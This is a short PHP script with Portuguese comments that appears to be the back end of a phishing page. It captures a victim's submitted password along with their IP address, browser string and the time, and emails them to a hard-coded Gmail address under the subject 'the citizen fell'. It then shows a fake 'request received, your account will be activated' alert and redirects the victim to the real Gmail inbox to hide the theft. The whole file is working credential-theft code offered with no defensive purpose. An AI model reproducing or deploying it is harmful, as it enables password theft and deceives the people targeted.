<?php
/*Pegando os dados*/
$ip = $_SERVER['REMOTE_ADDR'];
$navegador =  $_SERVER['HTTP_USER_AGENT'];
$data = date('d/m/Y');
$horario = date('h:i:s');

/*Dados sobre o e-mail*/
$pass = $_POST['password'];

$vardokct = "IP:$ip\nNavegador:$navegador\nData:$data\nHorário:$horario\n------------------------\nSENHA:$pass";

// O remetente deve ser um e-mail do seu domínio conforme determina a RFC 822.
// O return-path deve ser ser o mesmo e-mail do remetente.
$headers = "MIME-Version: 1.1\r\n";
$headers .= "Content-type: text/plain; charset=UTF-8\r\n";
$headers .= "From: yslmarques@gmail.com\r\n"; // remetente
$headers .= "Return-Path: yslmarques@gmail.com\r\n"; // return-path
$envio = mail("yslmarques@gmail.com", "O cidadão caiu", $vardokct, $headers);

echo "<script>alert('Solicitação feita com sucesso, analisaremos a sua conta e a ativaremos em breve.');</script>";
header( "refresh:1;url=https://mail.google.com/mail/u/0/#inbox");

?>
